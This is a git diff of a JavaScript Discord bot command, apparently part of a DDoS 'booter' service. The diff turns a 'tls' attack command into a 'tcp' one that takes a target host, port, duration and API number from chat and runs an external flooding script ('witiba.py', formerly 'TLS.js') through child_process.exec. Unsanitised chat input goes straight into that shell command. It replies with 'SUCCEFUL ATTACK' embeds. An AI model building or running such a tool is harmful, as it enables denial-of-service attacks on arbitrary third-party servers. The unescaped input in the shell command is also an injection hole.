@@ -1,10 +1,14 @@
 const Discord = require("discord.js");
+const ms = require("ms");
+const ping = require("ping");
+const libquery = require("libquery");
 
 exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const duration = message.content.split (" ")[3]
+const times = message.content.split (" ")[3]
+const api = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -12,20 +16,60 @@ if (message.channel.id != room) {
 	return;
   }
 
+function Warn(message) {
+  var embed0 = new Discord.MessageEmbed()
+  .setTitle("WARNING!!")
+  .setDescription(message)
+  .setColor("RANDOM")
+  return embed0;
+}
+
+function isLetter(c) {
+  return c.toLowerCase() != c.toUpperCase();
+}
+
 // Example command
 if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;tls https://akusygkmu.com time threads`")
-	.setFooter("Please do not attack government server!")
+	.setDescription("`contoh ;tcp target port time api`")
+	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
 	}
 
+//BLACKLISTING SYSTEM 
+ if (args[1] === "IP") {
+  message.channel.send(Warn("TARGET IS BLACKLISTED!"));
+  return;
+}
+  if (Number(api) > ayarlar.apis) {
+    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
+    return;
+  }
+  if (Number(api) < ayarlar.apis) {
+    message.channel.send(Warn("🚫 the api is out of tune ! 🚫"));
+    return;
+  }
+  if (isLetter(port)) {
+    message.channel.send(Warn("time cannot contain characters!"));
+    return;
+  }
+  if (isLetter(port)) {
+    message.channel.send(Warn("Time cannot contain characters!"));
+    return;
+  }
+  if (Number(port) > ayarlar.maxtime) {
+    message.channel.send(Warn("🚫 Max time is " + ayarlar.maxtime + " seconds! 🚫"));
+    return;
+  }
+
+
+
 // Command attack
 var exec = require('child_process').exec
-exec(`node TLS.js ${host} ${port} 64 ${duration}`, (error, stdout, stderr) => {
+exec(`python witiba.py ${host} ${port} ${times}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -34,10 +78,10 @@ setTimeout(function(){
 
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ZER0 BOT** 🚀')
+	.setTitle('☢️ **BIGMOM BOT** ☢️')
 	.setTimestamp()
-  .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓟𝓸𝓻𝓽** : `" + port + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HOME 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
-	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
+  .setDescription("`SUCCEFUL ATTACK`")
+	.setFooter('© Developer: YUKAI', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -45,7 +89,7 @@ const embed = new Discord.MessageEmbed()
  }, 5000); //time in milliseconds 1000 milliseconds = 1 seconds
 
 // Attack Gif
-var gifler = ["https://media.giphy.com/media/l4KhQo2MESJkc6QbS/giphy.gif", "https://media.giphy.com/media/jzHFPlw89eTqU/giphy.gif"];
+var gifler = ["https://media.tenor.com/Oq1PYVh8AKAAAAAM/anime-lol.gif", "https://media.tenor.com/Oq1PYVh8AKAAAAAM/anime-lol.gif"];
     var attackgif = gifler[Math.floor((Math.random() * gifler.length))];
 
 // Verify Gif
@@ -56,10 +100,10 @@ var gify = ["https://media.giphy.com/media/6036p0cTnjUrNFpAlr/giphy.gif"];
 console.log('Start Verify ID Discord:' +  message.guild.id)
 const embed = new Discord.MessageEmbed()
 	.setColor('RANDOM')
-	.setTitle('🚀 **ZER0 BOT** 🚀')
+	.setTitle('🚀 **BIGMOM BOT** 🚀')
 	.setTimestamp()
 	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
-	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
+	.setFooter('© Developer: YUKAI', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
@@ -70,12 +114,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['tls'],
+  aliases: ['tcp'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'tls',
-  description: 'zxcr9999',
-  usage: 'tls'
+  name: 'tcp',
+  description: 'YUKAI',
+  usage: 'tcp'
 }
